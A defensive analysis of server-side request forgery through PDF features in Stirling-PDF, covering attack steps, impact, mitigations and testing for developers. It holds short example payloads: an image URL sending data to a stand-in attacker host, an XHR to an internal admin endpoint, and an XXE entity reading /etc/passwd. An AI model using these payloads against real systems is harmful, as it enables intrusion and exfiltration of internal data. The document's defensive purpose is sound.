## Deep Analysis: Server-Side Request Forgery (SSRF) via PDF Features in Stirling-PDF

This analysis delves into the specific attack path of Server-Side Request Forgery (SSRF) within the Stirling-PDF application, focusing on the exploitation of PDF features. We will break down the attack, its potential impact, mitigation strategies for the development team, and recommendations for testing and verification.

**Understanding the Vulnerability: SSRF via PDF Features**

The core of this vulnerability lies in the inherent capabilities of the PDF format to reference external resources and execute embedded code. When Stirling-PDF processes a PDF, it may interpret and act upon these embedded instructions, potentially leading to unintended network requests initiated by the server itself. This is the essence of SSRF.

**Detailed Breakdown of the Attack Path:**

1. **Attacker Crafts Malicious PDF:** The attacker's initial step involves creating a PDF file specifically designed to trigger an SSRF vulnerability. This PDF will contain elements that force Stirling-PDF to make outbound network requests.

2. **Exploitable PDF Features:**  Several PDF features can be leveraged for this attack:

    * **External Resources (e.g., `<img src="...">`, `<link href="...">`):** PDFs can reference external images, stylesheets, fonts, and other resources via URLs. An attacker can embed URLs pointing to their controlled server. When Stirling-PDF attempts to render or process the PDF, it will try to fetch these resources.
        * **Example:**  `<img src="http://attacker.com/data_exfiltration?data=...">`
        * **Impact:** The server will make a GET request to `attacker.com`, potentially revealing information in the URL parameters (e.g., internal file paths, configuration details).

    * **JavaScript Execution:** PDFs can contain embedded JavaScript code. While the execution environment might be sandboxed to some extent, certain JavaScript APIs can be abused to make network requests.
        * **Example:**  `var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://internal-service:8080/admin'); xhr.send();`
        * **Impact:** The server could be forced to interact with internal services, potentially triggering actions or revealing information.

    * **Form Actions:** PDF forms can have actions associated with buttons or fields, including submitting data to a specified URL.
        * **Example:** A form with an action set to `http://internal-dashboard/delete_user?id=123`.
        * **Impact:**  The server could inadvertently trigger actions on internal systems based on the form data.

    * **XML External Entity (XXE) Injection (Less Common in Standard PDFs, but relevant for certain PDF processing libraries):** If Stirling-PDF utilizes a vulnerable XML parser for handling specific PDF structures (like XFA forms), an attacker might be able to inject external entity declarations that force the server to fetch local or remote files.
        * **Example (within a vulnerable XML structure):** `<!DOCTYPE foo [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]> <bar>&x;</bar>`
        * **Impact:**  The server could be forced to read local files or make requests to external URLs.

    * **URI Actions (e.g., `GoToR` actions with remote URLs):**  PDFs can define actions that are triggered upon certain events (like clicking a link). These actions can involve navigating to a remote URL.
        * **Example:** A link with an action to open `http://internal-monitoring-system/status`.
        * **Impact:** The server could make requests to internal services when processing the PDF.

3. **Stirling-PDF Processes the Malicious PDF:** The user uploads or provides the malicious PDF to Stirling-PDF for processing (e.g., conversion, merging, splitting).

4. **Server Initiates Malicious Request:**  During the processing phase, Stirling-PDF's backend attempts to interpret and execute the embedded instructions within the PDF. This leads to the server making an outbound network request to the attacker-controlled or internal target specified in the malicious PDF.

**Consequences in Detail:**

* **Access Internal Resources or Systems [HIGH RISK]:**
    * **Bypassing Firewalls and Network Segmentation:** The Stirling-PDF server, being within the internal network, can access resources that are typically protected from external access by firewalls.
    * **Interacting with Internal Services:** Attackers can target internal APIs, databases, configuration management systems, monitoring dashboards, or other services that are not exposed to the internet.
    * **Potential Actions:** Reading sensitive configuration data, triggering administrative functions, accessing internal documentation, or even compromising other internal systems.
    * **Example Scenario:** Accessing an internal database server at `http://internal-db:5432` to retrieve sensitive user data.

* **Exfiltrate Sensitive Information [HIGH RISK]:**
    * **Forcing the Server to Send Data:** The attacker can craft the malicious PDF to make requests to their controlled server, embedding sensitive data within the URL parameters or the request body.
    * **Targeting Local Files:** If XXE is possible, the attacker could force the server to read local files (e.g., configuration files containing API keys, database credentials) and send their contents to the attacker's server.
    * **Leveraging Internal APIs:** If the attacker knows of internal APIs that return sensitive information, they can force the server to make requests to these APIs and send the responses back to them.
    * **Example Scenario:**  The PDF contains JavaScript that reads the content of a temporary file generated during processing and sends it to `http://attacker.com/receive_data`.

**Mitigation Strategies for the Development Team:**

To effectively address this high-risk vulnerability, the development team should implement a multi-layered approach:

* **Input Validation and Sanitization:**
    * **Strict URL Validation:**  Implement rigorous validation for any URLs encountered during PDF processing. Use whitelists of allowed protocols (e.g., `http`, `https` only for external resources, potentially restricting to `data:` URIs for embedded resources). Blacklisting is generally less effective.
    * **Domain Whitelisting (if feasible):** If the application only needs to fetch resources from a limited set of external domains, enforce a whitelist.
    * **Disabling or Sandboxing Risky Features:**  Consider disabling or heavily restricting features known to be prone to SSRF, such as JavaScript execution within PDFs or the fetching of remote resources. If these features are necessary, implement robust sandboxing mechanisms.

* **Network Segmentation and Access Control:**
    * **Principle of Least Privilege:**  Ensure the Stirling-PDF server has only the necessary network permissions to perform its intended functions. Restrict its ability to initiate connections to internal networks or arbitrary external hosts.
    * **Internal Firewalls:** Implement internal firewalls to further restrict the server's outbound connections, even if an SSRF vulnerability exists.

* **Content Security Policy (CSP):**
    * **Implement a strong CSP:**  Configure CSP headers for the web interface of Stirling-PDF to restrict the origins from which the application itself can load resources. While this doesn't directly prevent SSRF during PDF processing, it can limit the impact if the attacker tries to leverage the vulnerability for client-side attacks.

* **Disable Unnecessary PDF Features:**
    * **Configuration Options:** Provide configuration options to disable features like JavaScript execution, remote resource fetching, and form actions if they are not essential for the application's core functionality.

* **Regular Security Audits and Penetration Testing:**
    * **Code Reviews:** Conduct thorough code reviews, specifically focusing on the PDF processing logic and how external resources are handled.
    * **Penetration Testing:** Engage security professionals to perform penetration testing, specifically targeting SSRF vulnerabilities through crafted PDFs.

* **Update Dependencies:**
    * **Keep PDF Processing Libraries Up-to-Date:** Ensure that any underlying PDF processing libraries used by Stirling-PDF are kept up-to-date with the latest security patches. Vulnerabilities in these libraries can directly lead to SSRF.

* **Logging and Monitoring:**
    * **Log Outbound Requests:** Implement logging of all outbound network requests made by the Stirling-PDF server during PDF processing. This can help in detecting suspicious activity.
    * **Alerting:** Set up alerts for unusual outbound requests, such as connections to private IP addresses or unexpected external domains.

* **Consider Alternative PDF Processing Methods:**
    * **Headless Browsers with Strict Controls:** If rendering is required, consider using a headless browser in a highly controlled and sandboxed environment with network restrictions.
    * **Specialized PDF Processing Libraries with Security Focus:**  Evaluate PDF processing libraries that have a strong focus on security and offer features to mitigate SSRF risks.

**Testing and Verification Strategies:**

The development team needs to rigorously test for this vulnerability:

* **Manual Testing with Crafted PDFs:**
    * **External Resource Inclusion:** Create PDFs with embedded `<img>`, `<link>`, and other tags pointing to attacker-controlled servers to verify if the server makes requests. Monitor the server logs for incoming requests.
    * **JavaScript Execution:**  Embed JavaScript code that attempts to make network requests to internal and external targets. Observe the server's behavior and any error messages.
    * **Form Actions:** Create PDFs with forms that submit data to internal and external URLs.
    * **XXE Payloads (if applicable):**  If the PDF processing involves XML parsing, attempt to inject XXE payloads to read local files or make outbound requests.
    * **URI Actions:**  Create links with `GoToR` actions pointing to internal and external URLs.

* **Automated Tools and Scanners:**
    * **Static Analysis Tools:** Utilize static analysis tools to identify potential SSRF vulnerabilities in the codebase related to PDF processing.
    * **Dynamic Application Security Testing (DAST) Tools:** Employ DAST tools that can crawl the application and submit crafted PDFs to identify SSRF vulnerabilities.

* **Burp Suite and Similar Proxies:**
    * **Intercept and Analyze Requests:** Use a proxy like Burp Suite to intercept and analyze the network requests made by the Stirling-PDF server during PDF processing. This allows you to identify if malicious requests are being initiated.

* **Specific Test Cases:**
    * **Targeting Internal Infrastructure:**  Craft PDFs that attempt to access known internal IP addresses and services (e.g., `127.0.0.1`, `192.168.1.1`, internal database servers).
    * **DNS Rebinding Attacks:** Test if the application is vulnerable to DNS rebinding, where a DNS record resolves to a public IP initially and then changes to an internal IP.
    * **Bypassing Whitelists (if implemented):**  Try to bypass any URL whitelisting mechanisms by using URL encoding, different protocols, or variations in domain names.

**Conclusion:**

The SSRF vulnerability via PDF features in Stirling-PDF poses a significant security risk. It allows attackers to leverage the server's capabilities to access internal resources and exfiltrate sensitive information. A comprehensive approach involving input validation, network segmentation, disabling risky features, regular security testing, and careful dependency management is crucial to mitigate this threat effectively. The development team should prioritize addressing this vulnerability due to its potential for severe impact. Continuous monitoring and proactive security measures are essential to protect the application and its users.
